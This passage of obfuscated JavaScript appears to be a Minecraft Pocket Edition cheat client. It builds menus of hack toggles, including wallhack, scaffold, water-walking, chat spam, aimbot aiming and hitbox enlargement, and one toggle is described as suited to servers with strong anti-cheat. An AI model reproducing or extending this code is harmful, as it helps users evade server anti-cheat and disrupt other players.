                                sregens['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sregend) {
                                            showRegenSwitch();
                                            sregend = true
                                        } else {
                                            GUIg['dismiss']();
                                            sregend = false
                                        };
                                        sregens['setChecked'](sregend)
                                    }
                                }));
                                _0x2bf6x147['addView'](sregens);
                                var dolphins = new Switch(ctx);
                                dolphins['setText']('水上漂[LB]');
                                dolphins['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                dolphins['setPadding'](10, 3, 3, 3);
                                dolphins['setTextSize'](15);
                                dolphins['setBackground'](module);
                                dolphins['getBackground']()['setAlpha'](120);
                                dolphins['setChecked'](dolphined);
                                dolphins['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!dolphined) {
                                            dolphinss = true;
                                            dolphined = true
                                            fctoast('随枫吖:适用于LB等反作弊能力高的')
                                        } else {
                                            dolphinss = false;
                                            dolphined = false
                                        };
                                        dolphins['setChecked'](dolphined)
                                    }
                                }));
                                _0x2bf6x147['addView'](dolphins);
                                var solidliquids = new Switch(ctx);
                                solidliquids['setText']('水上漂');
                                solidliquids['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                solidliquids['setPadding'](10, 3, 3, 3);
                                solidliquids['setTextSize'](15);
                                solidliquids['setBackground'](module);
                                solidliquids['getBackground']()['setAlpha'](120);
                                solidliquids['setChecked'](solidliquided);
                                solidliquids['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!solidliquided) {
                                            solidliquidss = true;
                                            solidliquided = true
                                        } else {
                                            solidliquidss = false;
                                            solidliquided = false;
                                            Block['setShape'](8, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](9, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](10, 0, 0, 0, 1, 0.0, 1);
                                            Block['setShape'](11, 0, 0, 0, 1, 0.0, 1);
                                            Block['defineLiquidBlock'](8, 'Water', [
                                                ['still_water', 0],
                                                ['still_water', 0]
                                            ], 8);
                                            Block['defineLiquidBlock'](10, 'Lava', [
                                                ['still_lava', 0],
                                                ['still_lava', 0]
                                            ], 10)
                                        };
                                        solidliquids['setChecked'](solidliquided)
                                    }
                                }));
                                _0x2bf6x147['addView'](solidliquids);
                                var frostwalkers = new Switch(ctx);
                                frostwalkers['setText']('水上结冰');
                                frostwalkers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                frostwalkers['setPadding'](10, 3, 3, 3);
                                frostwalkers['setTextSize'](15);
                                frostwalkers['setBackground'](module);
                                frostwalkers['getBackground']()['setAlpha'](120);
                                frostwalkers['setChecked'](frostwalkered);
                                frostwalkers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!frostwalkered) {
                                            frostwalkerss = true;
                                            frostwalkered = true
                                        } else {
                                            frostwalkerss = false;
                                            frostwalkered = false
                                        };
                                        frostwalkers['setChecked'](frostwalkered)
                                    }
                                }));
                                _0x2bf6x147['addView'](frostwalkers);
                                var safewalks = new Switch(ctx);
                                safewalks['setText']('安全行走');
                                safewalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                safewalks['setPadding'](10, 3, 3, 3);
                                safewalks['setTextSize'](15);
                                safewalks['setBackground'](module);
                                safewalks['getBackground']()['setAlpha'](120);
                                safewalks['setChecked'](safewalked);
                                safewalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!safewalked) {
                                            safewalkss = true;
                                            safewalked = true
                                            fctoast('随枫吖:走到一个方块的边缘不会掉下去')
                                        } else {
                                            safewalkss = false;
                                            safewalked = false
                                        };
                                        safewalks['setChecked'](safewalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](safewalks);
                                var scaffoldwalks = new Switch(ctx);
                                scaffoldwalks['setText']('脚下方块');
                                scaffoldwalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                scaffoldwalks['setPadding'](10, 3, 3, 3);
                                scaffoldwalks['setTextSize'](15);
                                scaffoldwalks['setBackground'](module);
                                scaffoldwalks['getBackground']()['setAlpha'](120);
                                scaffoldwalks['setChecked'](scaffoldwalked);
                                scaffoldwalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!scaffoldwalked) {
                                            scaffoldwalkss = true;
                                            scaffoldwalked = true
                                            fctoast('随枫吖:在你看来是方块，别人不一定，可能会被服务器检测飞行')
                                        } else {
                                            scaffoldwalkss = false;
                                            scaffoldwalked = false
                                        };
                                        scaffoldwalks['setChecked'](scaffoldwalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](scaffoldwalks);
                                var autoclimbs = new Switch(ctx);
                                autoclimbs['setText']('自动攀缘');
                                autoclimbs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autoclimbs['setPadding'](10, 3, 3, 3);
                                autoclimbs['setTextSize'](15);
                                autoclimbs['setBackground'](module);
                                autoclimbs['getBackground']()['setAlpha'](120);
                                autoclimbs['setChecked'](autoclimbed);
                                autoclimbs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autoclimbed) {
                                            autoclimbss = true;
                                            autoclimbed = true
                                        } else {
                                            autoclimbss = false;
                                            autoclimbed = false
                                        };
                                        autoclimbs['setChecked'](autoclimbed)
                                    }
                                }));
                                _0x2bf6x147['addView'](autoclimbs);
                                var wallhacks = new Switch(ctx);
                                wallhacks['setText']('透视[穿墙]');
                                wallhacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                wallhacks['setPadding'](10, 3, 3, 3);
                                wallhacks['setTextSize'](15);
                                wallhacks['setBackground'](module);
                                wallhacks['getBackground']()['setAlpha'](120);
                                wallhacks['setChecked'](wallhacked);
                                wallhacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!wallhacked) {
                                            wallhackss = true;
                                            wallhacked = true
                                        } else {
                                            wallhackss = false;
                                            wallhacked = false;
                                            Entity['setCollisionSize'](Player['getEntity'](), 1, 2)
                                        };
                                        wallhacks['setChecked'](wallhacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](wallhacks);
                                menu3 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu3['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu3['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x156 = new TextView(ctx);
                _0x2bf6x156['setText']('更多');
                _0x2bf6x156['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x156['setTextSize'](24);
                _0x2bf6x156['setBackground'](theme);
                _0x2bf6x156['getBackground']()['setAlpha'](100);
                _0x2bf6x156['setGravity'](Gravity.CENTER);
                _0x2bf6x156['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x157();
                        exitmisc();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x156);

                function _0x2bf6x157() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x158 = new TextView(ctx);
                                _0x2bf6x158['setTextSize'](20);
                                _0x2bf6x158['setText']('-| 更多 |-');
                                _0x2bf6x158['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x158['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x158['getBackground']()['setAlpha'](120);
                                _0x2bf6x158['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x158);
                                var _0x2bf6x159 = new Button(ctx);
                                _0x2bf6x159['setText']('退出客户端');
                                _0x2bf6x159['setTextColor'](Color['rgb'](255, 0, 255));
                                _0x2bf6x159['setTextSize'](25);
                                _0x2bf6x159['setBackground'](destructbg);
                                _0x2bf6x159['getBackground']()['setAlpha'](150);
                                _0x2bf6x159['setGravity'](Gravity.CENTER);
                                _0x2bf6x159['setOnClickListener'](new View.OnClickListener({
                                    onClick: function(_0x2bf6x132) {
                                        ccrash();
                                        fctoast('欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766')
                                    }
                                }));
                                _0x2bf6x147['addView'](_0x2bf6x159);
                                var spams = new Switch(ctx);
                                spams['setText']('开启刷屏');
                                spams['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                spams['setPadding'](10, 3, 3, 3);
                                spams['setTextSize'](15);
                                spams['setBackground'](module);
                                spams['getBackground']()['setAlpha'](120);
                                spams['setChecked'](spamed);
                                spams['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!spamed) {
                                            spamss = true;
                                            spamed = true;
                                            fctoast('在聊天框内发送!spam <text>来刷屏')
                                        } else {
                                            spamss = false;
                                            spamed = false
                                        };
                                        spams['setChecked'](spamed)
                                    }
                                }));
                                _0x2bf6x147['addView'](spams);
                                var leetspeaks = new Switch(ctx);
                                leetspeaks['setText']('特色英语');
                                leetspeaks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                leetspeaks['setPadding'](10, 3, 3, 3);
                                leetspeaks['setTextSize'](15);
                                leetspeaks['setBackground'](module);
                                leetspeaks['getBackground']()['setAlpha'](120);
                                leetspeaks['setChecked'](leetspeaked);
                                leetspeaks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!leetspeaked) {
                                            leetspeakss = true;
                                            leetspeaked = true
                                            fctoast('随枫吖:可以把你发出的英文用各种符号拼接的方式，形成乱码')
                                        } else {
                                            leetspeakss = false;
                                            leetspeaked = false
                                        };
                                        leetspeaks['setChecked'](leetspeaked)
                                    }
                                }));
                                _0x2bf6x147['addView'](leetspeaks);
                                var criticaltrailss = new Switch(ctx);
                                criticaltrailss['setText']('临时粒子');
                                criticaltrailss['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                criticaltrailss['setPadding'](10, 3, 3, 3);
                                criticaltrailss['setTextSize'](15);
                                criticaltrailss['setBackground'](module);
                                criticaltrailss['getBackground']()['setAlpha'](120);
                                criticaltrailss['setChecked'](criticaltrailsed);
                                criticaltrailss['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!criticaltrailsed) {
                                            criticaltrailsss = true;
                                            criticaltrailsed = true;
                                            fctoast('随枫吖:会很卡！')
                                        } else {
                                            criticaltrailsss = false;
                                            criticaltrailsed = false
                                        };
                                        criticaltrailss['setChecked'](criticaltrailsed)
                                    }
                                }));
                                _0x2bf6x147['addView'](criticaltrailss);
                                var firepunchs = new Switch(ctx);
                                firepunchs['setText']('火焰手');
                                firepunchs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                firepunchs['setPadding'](10, 3, 3, 3);
                                firepunchs['setTextSize'](15);
                                firepunchs['setBackground'](module);
                                firepunchs['getBackground']()['setAlpha'](120);
                                firepunchs['setChecked'](firepunched);
                                firepunchs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!firepunched) {
                                            firepunchss = true;
                                            firepunched = true
                                        } else {
                                            firepunchss = false;
                                            firepunched = false
                                        };
                                        firepunchs['setChecked'](firepunched)
                                    }
                                }));
                                _0x2bf6x147['addView'](firepunchs);
                                var derps = new Switch(ctx);
                                derps['setText']('摇头[旋转]');
                                derps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                derps['setPadding'](10, 3, 3, 3);
                                derps['setTextSize'](15);
                                derps['setBackground'](module);
                                derps['getBackground']()['setAlpha'](120);
                                derps['setChecked'](derped);
                                derps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!derped) {
                                            derpss = true;
                                            derped = true
                                        } else {
                                            derpss = false;
                                            derped = false
                                        };
                                        derps['setChecked'](derped)
                                    }
                                }));
                                _0x2bf6x147['addView'](derps);
                                var twerks = new Switch(ctx);
                                twerks['setText']('疯狂潜行');
                                twerks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                twerks['setPadding'](10, 3, 3, 3);
                                twerks['setTextSize'](15);
                                twerks['setBackground'](module);
                                twerks['getBackground']()['setAlpha'](120);
                                twerks['setChecked'](twerked);
                                twerks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!twerked) {
                                            twerkss = true;
                                            twerked = true
                                        } else {
                                            twerkss = false;
                                            twerked = false
                                        };
                                        twerks['setChecked'](twerked)
                                    }
                                }));
                                _0x2bf6x147['addView'](twerks);
                                var backfaces = new Switch(ctx);
                                backfaces['setText']('摇头[上下]');
                                backfaces['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                backfaces['setPadding'](10, 3, 3, 3);
                                backfaces['setTextSize'](15);
                                backfaces['setBackground'](module);
                                backfaces['getBackground']()['setAlpha'](120);
                                backfaces['setChecked'](backfaceed);
                                backfaces['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!backfaceed) {
                                            backfacess = true;
                                            backfaceed = true
                                        } else {
                                            backfacess = false;
                                            backfaceed = false
                                        };
                                        backfaces['setChecked'](backfaceed)
                                    }
                                }));
                                _0x2bf6x147['addView'](backfaces);
                                var stealths = new Switch(ctx);
                                stealths['setText']('秘密飞行');
                                stealths['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                stealths['setPadding'](10, 3, 3, 3);
                                stealths['setTextSize'](15);
                                stealths['setBackground'](module);
                                stealths['getBackground']()['setAlpha'](120);
                                stealths['setChecked'](stealthed);
                                stealths['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!stealthed) {
                                            stealthss = true;
                                            stealthed = true
                                        } else {
                                            stealthss = false;
                                            stealthed = false
                                        };
                                        stealths['setChecked'](stealthed)
                                    }
                                }));
                                _0x2bf6x147['addView'](stealths);
                                menu4 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu4['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu4['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                menu = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 5, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']() / 1);
                menu['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                menu['showAtLocation'](ctx['getWindow']()['getDecorView'](), 0, 0, 0)
            } catch (error) {
                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
            }
        }
    }))
}

function exit() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitUI['dismiss']();
                        menu['dismiss']();
                        showMenuBtn()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitcombat() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitcombatUI['dismiss']();
                        menu1['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitcombatUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitcombatUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitcombatUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitcombatUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitmotion() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitmotionUI['dismiss']();
                        menu2['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitmotionUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitmotionUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitmotionUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitmotionUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitplayer() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitplayerUI['dismiss']();
                        menu3['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitplayerUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitplayerUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitplayerUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitplayerUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitmisc() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitmiscUI['dismiss']();
                        menu4['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitmiscUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitmiscUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitmiscUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitmiscUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function getNearestEntity(_0x2bf6x163) {
    var _0x2bf6x164 = Server['getAllPlayers']();
    var _0x2bf6x165 = _0x2bf6x163;
    var _0x2bf6x166 = null;
    for (var _0x2bf6x167 = 0; _0x2bf6x167 < _0x2bf6x164['length']; _0x2bf6x167++) {
        var _0x2bf6x28 = Entity['getX'](_0x2bf6x164[_0x2bf6x167]) - getPlayerX();
        var _0x2bf6x27 = Entity['getY'](_0x2bf6x164[_0x2bf6x167]) - getPlayerY();
        var _0x2bf6x29 = Entity['getZ'](_0x2bf6x164[_0x2bf6x167]) - getPlayerZ();
        var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x28, 2) + Math['pow'](_0x2bf6x27, 2) + Math['pow'](_0x2bf6x29, 2));
        if (_0x2bf6x168 < _0x2bf6x165 && _0x2bf6x168 > 0 && Entity['getHealth'](_0x2bf6x164[_0x2bf6x167]) >= 1 && isNotTeam(_0x2bf6x166)) {
            _0x2bf6x165 = _0x2bf6x168;
            _0x2bf6x166 = _0x2bf6x164[_0x2bf6x167]
        }
    };
    if (isNotTeam(_0x2bf6x166)) {
        return _0x2bf6x166
    }
}

function nearArrow(_0x2bf6x16a) {
    var _0x2bf6x16b = Entity['getAll']();
    var _0x2bf6x165 = _0x2bf6x16a;
    var _0x2bf6x166 = null;
    for (var _0x2bf6x167 = 0; _0x2bf6x167 < _0x2bf6x16b['length']; _0x2bf6x167++) {
        var _0x2bf6x28 = Entity['getX'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerX();
        var _0x2bf6x27 = Entity['getY'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerY();
        var _0x2bf6x29 = Entity['getZ'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerZ();
        var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x28, 2) + Math['pow'](_0x2bf6x27, 2) + Math['pow'](_0x2bf6x29, 2));
        if (_0x2bf6x168 < _0x2bf6x165 && _0x2bf6x168 > 0) {
            _0x2bf6x165 = _0x2bf6x168;
            _0x2bf6x166 = _0x2bf6x16b[_0x2bf6x167]
        }
    };
    return _0x2bf6x166
}

function removeColors(_0x2bf6x25) {
    var _0x2bf6x16d = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'k', 'l', 'm', 'n', 'o', 'r'];
    if (_0x2bf6x25 != null) {
        _0x2bf6x16d['forEach'](function(_0x2bf6x16e) {
            _0x2bf6x25 = _0x2bf6x25['replace'](new RegExp('§' + _0x2bf6x16e, 'g'), '')
        });
        return _0x2bf6x25
    } else {
        return ''
    }
}

function isNotTeam(_0x2bf6x166) {
    var _0x2bf6x170 = true;
    for (i = 0; i < team['length']; i++) {
        var _0x2bf6x171 = removeColors(Entity['getNameTag'](_0x2bf6x166));
        if (_0x2bf6x171 == team[i]) {
            _0x2bf6x170 = false
        }
    };
    return _0x2bf6x170
}

function aimAtEnt(_0x2bf6x166, _0x2bf6x173) {
    if (_0x2bf6x166 != null) {
        var _0x2bf6x174 = Entity['getX'](_0x2bf6x166) - getPlayerX();
        var _0x2bf6x175 = Entity['getY'](_0x2bf6x166) - getPlayerY();
        var _0x2bf6x176 = Entity['getZ'](_0x2bf6x166) - getPlayerZ();
        if (_0x2bf6x173 != null && posinstanceofArray) {
            _0x2bf6x174 = Entity['getX'](_0x2bf6x166) - _0x2bf6x173[0];
            _0x2bf6x175 = Entity['getY'](_0x2bf6x166) - _0x2bf6x173[1];
            _0x2bf6x176 = Entity['getZ'](_0x2bf6x166) - _0x2bf6x173[2]
        };
        var _0x2bf6x177 = '63';
        if (Entity['getEntityTypeId'](_0x2bf6x166) != _0x2bf6x177) {
            _0x2bf6x175 += 0.5
        };
        var _0x2bf6x178 = Entity['getX'](_0x2bf6x166) + 0.5;
        var _0x2bf6x179 = Entity['getY'](_0x2bf6x166);
        var _0x2bf6x17a = Entity['getZ'](_0x2bf6x166) + 0.5;
        var _0x2bf6x17b = Math['sqrt'](_0x2bf6x174 * _0x2bf6x174 + _0x2bf6x175 * _0x2bf6x175 + _0x2bf6x176 * _0x2bf6x176);
        var _0x2bf6x175 = _0x2bf6x175 / _0x2bf6x17b;
        var _0x2bf6x17c = Math['asin'](_0x2bf6x175);
        _0x2bf6x17c = _0x2bf6x17c * 180.0 / Math['PI'];
        _0x2bf6x17c = -_0x2bf6x17c;
        var _0x2bf6x17d = -Math['atan2'](_0x2bf6x178 - (Player['getX']() + 0.5), _0x2bf6x17a - (Player['getZ']() + 0.5)) * (180 / Math['PI']);
        if (_0x2bf6x17c < 89 && _0x2bf6x17c > -89) {
            Entity['setRot'](Player['getEntity'](), _0x2bf6x17d, _0x2bf6x17c)
        }
    }
}

function bowAimAt(_0x2bf6x166) {
    var _0x2bf6x17f = 1;
    var _0x2bf6x180 = Entity['getX'](_0x2bf6x166) - Player['getX']();
    var _0x2bf6x181 = Entity['getEntityTypeId'](_0x2bf6x166) == EntityType['PLAYER'] ? Entity['getY'](_0x2bf6x166) - Player['getY']() : Entity['getY'](_0x2bf6x166) + 1 - Player['getY']();
    var _0x2bf6x182 = Entity['getZ'](_0x2bf6x166) - Player['getZ']();
    var _0x2bf6x17d = (Math['atan2'](_0x2bf6x182, _0x2bf6x180) * 180 / Math['PI']) - 90;
    var _0x2bf6x183 = Math['sqrt'](_0x2bf6x180 * _0x2bf6x180 + _0x2bf6x182 * _0x2bf6x182);
    var _0x2bf6x184 = 0.007;
    var _0x2bf6x185 = (_0x2bf6x17f * _0x2bf6x17f * _0x2bf6x17f * _0x2bf6x17f - _0x2bf6x184 * (_0x2bf6x184 * (_0x2bf6x183 * _0x2bf6x183) + 2 * _0x2bf6x181 * (_0x2bf6x17f * _0x2bf6x17f)));
    var _0x2bf6x17c = -(180 / Math['PI']) * (Math['atan']((_0x2bf6x17f * _0x2bf6x17f - Math['sqrt'](_0x2bf6x185)) / (_0x2bf6x184 * _0x2bf6x183)));
    if (_0x2bf6x17c < 89 && _0x2bf6x17c > -89) {
        setRot(Player['getEntity'](), _0x2bf6x17d, _0x2bf6x17c)
    }
}

function entityHurtHook(_0x2bf6x187, _0x2bf6x188, _0x2bf6x189) {
    if (antikbss) {
        return;
        Entity['setImmobile'](getPlayerEnt, true);
        kbTick = 1
    }
}

function toDirectionalVector(_0x2bf6x18b, _0x2bf6x18c, _0x2bf6x18d) {
    _0x2bf6x18b[0] = Math['cos'](_0x2bf6x18c) * Math['cos'](_0x2bf6x18d);
    _0x2bf6x18b[1] = Math['sin'](_0x2bf6x18d);
    _0x2bf6x18b[2] = Math['sin'](_0x2bf6x18c) * Math['cos'](_0x2bf6x18d)
}

function attackHook(_0x2bf6x187, _0x2bf6x188) {
    if (_0x2bf6x187 == Player['getEntity']() && grappless && Entity['getHealth'](_0x2bf6x188) > 0) {
        setPosition(getPlayerEnt(), Entity['getX'](_0x2bf6x188), Entity['getY'](_0x2bf6x188), Entity['getZ'](_0x2bf6x188))
    };
    if (_0x2bf6x187 == Player['getEntity']() && criticales && Entity['getHealth'](_0x2bf6x188) > 0) {
        if (critTick >= 13) {
            critTick = 0
        }
    };
    if (_0x2bf6x187 == Player.getEntity() && bypasshitboxs && Entity.getHealth(_0x2bf6x188) > 0) {
        Entity.setCollisionSize(_0x2bf6x188, 10, 30);
    }
    if (_0x2bf6x187 == Player['getEntity']() && hitjumpss && Utils['Player']['isOnGround']()) {
        setVelY(getPlayerEnt(), 0.4)
    };
    if (_0x2bf6x187 == Player['getEntity']() && firepunchss) {
        var _0x2bf6x18f = Entity['getX'](_0x2bf6x188);
